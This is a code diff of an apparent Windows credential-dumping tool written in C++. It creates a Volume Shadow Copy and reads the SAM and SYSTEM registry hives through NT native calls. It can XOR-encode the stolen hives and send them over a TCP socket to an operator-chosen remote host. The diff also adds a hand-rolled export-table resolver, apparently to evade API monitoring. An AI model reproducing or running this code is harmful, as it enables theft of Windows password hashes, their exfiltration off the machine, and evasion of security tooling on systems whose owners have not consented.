@@ -9,8 +9,7 @@
 #pragma comment(lib, "vssapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-// 0: No debug; 1: Basic info; 2: Debugging
-#define DEBUG_LEVEL 1
+#define DEBUG_LEVEL 1    // 0: No debug (Only errors); 1: Basic info; 2: Debugging
 #define FILE_OPEN 0x00000001
 #define FILE_OVERWRITE_IF 0x00000005
 #define FILE_SYNCHRONOUS_IO_NONALERT 0x00000010
@@ -20,85 +19,20 @@ typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buff
 typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
 typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
 
+typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
 typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
 typedef NTSTATUS(WINAPI* NtWriteFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 
+NtReadVirtualMemoryFn NtReadVirtualMemory;
 NtCreateFileFn NtCreateFile;
 NtReadFileFn NtReadFile;
 NtCloseFn NtClose;
 NtWriteFileFn NtWriteFile;
 
 
-bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
-    FileHeader header;
-    memset(&header, 0, sizeof(header));
-
-    strncpy_s(header.filename, sizeof(header.filename), filename.c_str(), _TRUNCATE);
-    header.filesize = htonl(static_cast<uint32_t>(filedata.size()));
-    header.checksum = htonl(0);
-
-    int bytes_sent = send(sock, reinterpret_cast<const char*>(&header), sizeof(header), 0);
-    if (bytes_sent != sizeof(header)) {
-        printf("[-] Error sending header for %s.\n", filename.c_str());
-        return false;
-    }
-
-    bytes_sent = send(sock, reinterpret_cast<const char*>(filedata.data()), static_cast<int>(filedata.size()), 0);
-    if (bytes_sent != filedata.size()) {
-        printf("[-] Error sending data for %s.\n", filename.c_str());
-        return false;
-    }
-
-    if (DEBUG_LEVEL >= 1) {
-        printf("[+] %s sent (%zu bytes)\n", filename.c_str(), filedata.size());
-    }
-    return true;
-}
-
-
-bool send_files_remotely(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const char* host, int port) {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        printf("[-] Error initializing Winsock.\n");
-        return false;
-    }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        printf("[-] Error creating socket.\n");
-        WSACleanup();
-        return false;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(port);
-    inet_pton(AF_INET, host, &serverAddr.sin_addr);
-
-    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
-        printf("Error conectando a %s:%d\n", host, port);
-        closesocket(sock);
-        WSACleanup();
-        return false;
-    }
-
-    if (DEBUG_LEVEL >= 1) {
-        printf("[+] Connected to %s:%d\n", host, port);
-    }
-    
-    bool success = true;
-    success &= send_file_over_socket(sock, "SAM", sam_data);
-    success &= send_file_over_socket(sock, "SYSTEM", system_data);
-
-    closesocket(sock);
-    WSACleanup();
-
-    return success;
-}
-
-
+// Cast to wstring
 std::wstring GuidToWString(GUID id) {
     wchar_t buf[64];
     StringFromGUID2(id, buf, 64);
@@ -106,6 +40,7 @@ std::wstring GuidToWString(GUID id) {
 }
 
 
+// Print results only if debugging
 void PrintHR(const char* label, HRESULT hr) {
     if (DEBUG_LEVEL >= 2) {
         std::cout << label << " -> 0x" << std::hex << hr << std::dec;
@@ -115,6 +50,7 @@ void PrintHR(const char* label, HRESULT hr) {
 }
 
 
+// Find if there are shadow copies, if there are return the Device Object of the first one
 BOOL list_shadows(std::wstring& outDeviceObject) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     PrintHR("CoInitializeEx", hr);
@@ -171,7 +107,7 @@ BOOL list_shadows(std::wstring& outDeviceObject) {
                 outDeviceObject = snap.m_pwszSnapshotDeviceObject;
                 found = TRUE;
                 VssFreeSnapshotProperties(&snap);
-                break; // Tomamos solo la primera que encontremos
+                break;
             }
             VssFreeSnapshotProperties(&snap);
         }
@@ -185,6 +121,7 @@ BOOL list_shadows(std::wstring& outDeviceObject) {
 }
 
 
+// Create Shadow Copy
 HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObject) {
     if (DEBUG_LEVEL >= 1) {
         std::wcout << L"[+] Creating Shadow Copy for: " << volumePath << L"\n";
@@ -250,7 +187,6 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         hr = pAsyncMetadata->Wait();
         PrintHR("GatherWriterMetadata Wait", hr);
 
-        // Obtener estado de finalización
         HRESULT hrMetadataStatus;
         hr = pAsyncMetadata->QueryStatus(&hrMetadataStatus, NULL);
         PrintHR("GatherWriterMetadata QueryStatus", hr);
@@ -280,7 +216,6 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         std::wcout << L"[+] SnapshotSet ID: " << GuidToWString(snapshotSetId) << std::endl;
     }
 
-    // Agregar el volumen al conjunto
     VSS_ID snapshotId;
     hr = pBackup->AddToSnapshotSet((WCHAR*)volumePath.c_str(), GUID_NULL, &snapshotId);
     PrintHR("AddToSnapshotSet", hr);
@@ -294,7 +229,6 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         std::wcout << L"[+] Snapshot ID: " << GuidToWString(snapshotId) << std::endl;
     }
 
-    // Preparar los escritores para el backup
     if (DEBUG_LEVEL >= 2) {
         std::cout << "[+] Calling PrepareForBackup..." << std::endl;
     }
@@ -351,7 +285,6 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
     }
 
     if (SUCCEEDED(hr)) {
-        // Obtener las propiedades del shadow copy creado
         VSS_SNAPSHOT_PROP snapProp;
         hr = pBackup->GetSnapshotProperties(snapshotId, &snapProp);
         if (SUCCEEDED(hr)) {
@@ -360,7 +293,7 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
                 std::wcout << L"\n\t[+] Shadow ID:       " << GuidToWString(snapProp.m_SnapshotId);
                 std::wcout << L"\n\t[+] Set ID:          " << GuidToWString(snapProp.m_SnapshotSetId);
                 std::wcout << L"\n\t[+] Original Volume: " << (snapProp.m_pwszOriginalVolumeName ? snapProp.m_pwszOriginalVolumeName : L"(null)");
-                std::wcout << L"\n\t[+] Device Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)"); // <---- ESTOOOOOOOOO
+                std::wcout << L"\n\t[+] Device Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)");
                 std::wcout << L"\n\t[+] Attributes:      0x" << std::hex << snapProp.m_lSnapshotAttributes << std::dec;
             }
             if (snapProp.m_pwszSnapshotDeviceObject) {
@@ -384,20 +317,77 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
 }
 
 
-void InitializeNTFunctions() {
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    NtCreateFile = (NtCreateFileFn)GetProcAddress(hNtdll, "NtCreateFile");
-    NtReadFile = (NtReadFileFn)GetProcAddress(hNtdll, "NtReadFile");
-    NtWriteFile = (NtWriteFileFn)GetProcAddress(hNtdll, "NtWriteFile");  // <-- Agregar esta línea
-    NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
+// Send one file over socket
+bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
+    FileHeader header;
+    memset(&header, 0, sizeof(header));
 
-    if (!NtCreateFile || !NtReadFile || !NtWriteFile || !NtClose) {
-        printf("Error: No se pudieron cargar las funciones de ntdll.dll\n");
-        exit(1);
+    strncpy_s(header.filename, sizeof(header.filename), filename.c_str(), _TRUNCATE);
+    header.filesize = htonl(static_cast<uint32_t>(filedata.size()));
+    header.checksum = htonl(0);
+
+    int bytes_sent = send(sock, reinterpret_cast<const char*>(&header), sizeof(header), 0);
+    if (bytes_sent != sizeof(header)) {
+        printf("[-] Error sending header for %s.\n", filename.c_str());
+        return false;
     }
+
+    bytes_sent = send(sock, reinterpret_cast<const char*>(filedata.data()), static_cast<int>(filedata.size()), 0);
+    if (bytes_sent != filedata.size()) {
+        printf("[-] Error sending data for %s.\n", filename.c_str());
+        return false;
+    }
+
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] %s sent (%zu bytes)\n", filename.c_str(), filedata.size());
+    }
+    return true;
 }
 
 
+// Create socket and send all files
+bool send_files_remotely(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const char* host, int port) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("[-] Error initializing Winsock.\n");
+        return false;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        printf("[-] Error creating socket.\n");
+        WSACleanup();
+        return false;
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(port);
+    inet_pton(AF_INET, host, &serverAddr.sin_addr);
+
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
+        printf("[-] Error conneting to %s:%d\n", host, port);
+        closesocket(sock);
+        WSACleanup();
+        return false;
+    }
+
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] Connected to %s:%d\n", host, port);
+    }
+
+    bool success = true;
+    success &= send_file_over_socket(sock, "SAM", sam_data);
+    success &= send_file_over_socket(sock, "SYSTEM", system_data);
+
+    closesocket(sock);
+    WSACleanup();
+
+    return success;
+}
+
+
+// Open file using NtCreateFile
 HANDLE OpenFileNT(const wchar_t* filePath) {
     UNICODE_STRING unicodeString;
     unicodeString.Buffer = (PWSTR)filePath;
@@ -408,7 +398,7 @@ HANDLE OpenFileNT(const wchar_t* filePath) {
     objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
     objectAttributes.RootDirectory = NULL;
     objectAttributes.ObjectName = &unicodeString;
-    objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
+    objectAttributes.Attributes = 0x40;
     objectAttributes.SecurityDescriptor = NULL;
     objectAttributes.SecurityQualityOfService = NULL;
 
@@ -430,7 +420,7 @@ HANDLE OpenFileNT(const wchar_t* filePath) {
     );
 
     if (status != 0) {
-        printf("Error al abrir archivo. Código NT: 0x%08X\n", status);
+        printf("[-] Error opening the file. NTSTATUS: 0x%08X\n", status);
         return NULL;
     }
 
@@ -438,7 +428,8 @@ HANDLE OpenFileNT(const wchar_t* filePath) {
 }
 
 
-std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
+// Read bytes using NtReadFile
+std::vector<BYTE> ReadBytesNT(HANDLE fileHandle) {
     std::vector<BYTE> fileContent;
     BYTE buffer[4096];
     IO_STATUS_BLOCK ioStatusBlock;
@@ -478,26 +469,30 @@ std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
 }
 
 
+// Read files
 std::vector<BYTE> read_file(const wchar_t* filePath) {
     std::vector<BYTE> fileContent;
     
-    // Abrir archivo
+    // Open file
     HANDLE fileHandle = OpenFileNT(filePath);
     if (!fileHandle) {
         printf("[-] Error: Not possible to open the file.\n");
         return fileContent;
     }
 
-    fileContent = ReadFileBytes(fileHandle);
+    // Read bytes
+    fileContent = ReadBytesNT(fileHandle);
     if (DEBUG_LEVEL >= 1) {
         printf("[+] Read %zu bytes from %ls\n", fileContent.size(), filePath);
     }
     
+    // Close handle
     NtClose(fileHandle);
     return fileContent;
 }
 
 
+// Write files with NtCreateFile and NtWriteFile
 BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
     UNICODE_STRING unicodeString;
     unicodeString.Buffer = (PWSTR)filePath;
@@ -568,7 +563,26 @@ BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
 }
 
 
-BOOL SaveSamAndSystemFiles(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const std::wstring& basePath, const std::wstring& sam_fname, const std::wstring& system_fname) {
+// XOR-encode bytes
+std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::string& key_xor) {
+    std::vector<BYTE> encoded_bytes = dump_bytes;
+
+    if (key_xor.empty()) {
+        return encoded_bytes;
+    }
+
+    int key_len = key_xor.length();
+
+    for (size_t i = 0; i < encoded_bytes.size(); i++) {
+        encoded_bytes[i] = encoded_bytes[i] ^ key_xor[i % key_len];
+    }
+
+    return encoded_bytes;
+}
+
+
+// Save locally SAM and SYSTEM files
+BOOL save_files_locally(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const std::wstring& basePath, const std::wstring& sam_fname, const std::wstring& system_fname) {
     BOOL success = TRUE;
     std::wstring samPath = L"\\??\\" + basePath + sam_fname;
     std::wstring systemPath = L"\\??\\" + basePath + system_fname;
@@ -587,23 +601,82 @@ BOOL SaveSamAndSystemFiles(const std::vector<BYTE>& sam_data, const std::vector<
 }
 
 
-std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::string& key_xor) {
-    std::vector<BYTE> encoded_bytes = dump_bytes;
-
-    if (key_xor.empty()) {
-        return encoded_bytes;
+// Custom implementation of GetProcAddress
+void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
+    int exportrva_offset = 136;
+    HANDLE hProcess = (HANDLE)-1;
+    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
+    DWORD e_lfanew_value = 0;
+    SIZE_T aux = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
+    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
+    WORD sizeopthdr_value = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
+    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
+    DWORD exportTableRVA_value = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
+    if (exportTableRVA_value != 0) {
+        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
+        DWORD numberOfNames_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
+        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
+        DWORD addressOfFunctionsVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
+        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
+        DWORD addressOfNamesVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
+        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
+        DWORD addressOfNameOrdinalsVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
+        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
+        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
+        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
+        for (int i = 0; i < (int)numberOfNames_value; i++) {
+            DWORD functionAddressVRA = 0;
+            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
+            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
+            char functionName[256];
+            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
+            if (strcmp(functionName, func_name) == 0) {
+                WORD ordinal = 0;
+                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
+                void* functionAddress;
+                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
+                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
+                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
+            }
+            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
+            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
+        }
     }
-
-    int key_len = key_xor.length();
-
-    for (size_t i = 0; i < encoded_bytes.size(); i++) {
-        encoded_bytes[i] = encoded_bytes[i] ^ key_xor[i % key_len];
-    }
-
-    return encoded_bytes;
+    return NULL;
 }
 
 
+// Initialize functions
+void InitializeNTFunctions() {
+    // You only need to use GetModuleHandle/LoadLibraryA and GetProcAddress to get NtReadVirtualMemory's address (https://github.com/ricardojoserf/MemorySnitcher)
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
+    if (!NtReadVirtualMemory) {
+        printf("[-] Error: NtReadVirtualMemory address could not be calculated\n");
+        exit(1);
+    }
+
+    // Get the rest of addresses from NtReadVirtualMemory's address
+    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
+    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
+    NtReadFile = (NtReadFileFn)CustomGetProcAddress(hNtdll, "NtReadFile");
+    NtWriteFile = (NtWriteFileFn)CustomGetProcAddress(hNtdll, "NtWriteFile");
+    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
+    if (!NtCreateFile || !NtReadFile || !NtWriteFile || !NtClose) {
+        printf("[-] Error: ntdll.dll functions addresses could not be calculated\n");
+        exit(1);
+    }
+}
+
+
+// Help message
 void print_help(int argc, char* argv[]) {
     std::vector<std::string> args(argv, argv + argc);
 
@@ -622,6 +695,7 @@ void print_help(int argc, char* argv[]) {
 }
 
 
+// Parse arguments
 void parse_arguments(int argc, char* argv[],
     std::wstring& output_dir,
     std::wstring& diskToShadow,
@@ -697,6 +771,18 @@ void parse_arguments(int argc, char* argv[],
             print_help(argc, argv);
         }
     }
+
+    if (DEBUG_LEVEL >= 2) {
+        std::wcout << L"Configuration:\n";
+        std::wcout << L"  Output Dir: " << output_dir << L"\n";
+        std::wcout << L"  Disk: " << diskToShadow << L"\n";
+        std::cout << "  XOR Encode: " << (xorencode ? "true" : "false") << "\n";
+        std::cout << "  XOR Key: " << key_xor << "\n";
+        std::cout << "  Save Locally: " << (saveLocally ? "true" : "false") << "\n";
+        std::cout << "  Send Remotely: " << (sendRemotely ? "true" : "false") << "\n";
+        std::cout << "  Host: " << host << "\n";
+        std::cout << "  Port: " << port << "\n";
+    }
 }
 
 
@@ -712,20 +798,9 @@ int main(int argc, char* argv[]) {
     int port;
     parse_arguments(argc, argv, output_dir, diskToShadow, xorencode, saveLocally, sendRemotely, key_xor, host, port);
 
+    // You need to use --save-local or --send-remote
     if (!saveLocally && !sendRemotely) {
         print_help(argc, argv);
-    }
-
-    if (DEBUG_LEVEL >= 2) {
-        std::wcout << L"Configuration:\n";
-        std::wcout << L"  Output Dir: " << output_dir << L"\n";
-        std::wcout << L"  Disk: " << diskToShadow << L"\n";
-        std::cout << "  XOR Encode: " << (xorencode ? "true" : "false") << "\n";
-        std::cout << "  XOR Key: " << key_xor << "\n";
-        std::cout << "  Save Locally: " << (saveLocally ? "true" : "false") << "\n";
-        std::cout << "  Send Remotely: " << (sendRemotely ? "true" : "false") << "\n";
-        std::cout << "  Host: " << host << "\n";
-        std::cout << "  Port: " << port << "\n";
     }
 
     // Initialize functions
@@ -779,7 +854,7 @@ int main(int argc, char* argv[]) {
     std::wstring sam_fname = L"\\sam.txt";
     std::wstring system_fname = L"\\system.txt";
     if (saveLocally) {
-        if (SaveSamAndSystemFiles(SamBytes, SystemBytes, output_dir, sam_fname, system_fname)) {
+        if (save_files_locally(SamBytes, SystemBytes, output_dir, sam_fname, system_fname)) {
             if (DEBUG_LEVEL >= 1) {
                 printf("[+] Success saving files locally\n");
             }
